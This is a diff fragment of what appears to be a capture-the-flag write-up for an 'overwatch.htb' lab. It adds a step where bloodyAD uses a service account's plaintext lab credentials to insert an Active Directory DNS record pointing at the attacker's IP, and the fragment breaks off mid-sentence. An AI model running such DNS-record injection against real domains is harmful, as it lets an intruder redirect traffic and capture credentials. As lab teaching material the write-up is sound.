@@ -409,5 +409,10 @@ Address:	10.129.244.81#53
 
 As seen here, it doesnt look to hold any records, maybe i can add one with my IP address
 
+```python
+bloodyAD --host s200401.overwatch.htb -d overwatch.htb -u sqlsvc -p 'TI0LKcfHzZw1Vv' add dnsRecord SQL07 10.10.14.61
+[+] SQL07 has been successfully added
+```
 
+So first ill add the 
 
